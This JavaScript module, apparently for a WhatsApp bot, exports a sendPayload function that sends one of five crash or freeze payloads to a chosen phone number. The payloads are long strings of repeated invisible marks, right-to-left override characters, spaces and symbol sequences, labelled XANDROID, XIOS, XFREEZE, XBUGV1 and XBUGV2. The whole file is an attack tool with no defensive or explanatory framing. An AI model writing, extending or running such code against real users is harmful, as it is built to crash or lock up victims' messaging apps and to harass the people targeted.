module.exports.sendPayload = async (client, target, type) => {
    const payloads = {
        XANDROID: '${;;}'.repeat(100),
        XIOS: '\u{200E}'.repeat(5000),
        XFREEZE: ' '.repeat(100000),
        XBUGV1: '‮'.repeat(1000),
        XBUGV2: '||'.repeat(500)
    };

    if(!client.info) throw new Error('Non connecté à WhatsApp');
    
    try {
        const chatId = target.includes('@') ? target : `${target}@c.us`;
        await client.sendMessage(chatId, payloads[type]);
    } catch(e) {
        throw new Error('Échec envoi: ' + e.message);
    }
};
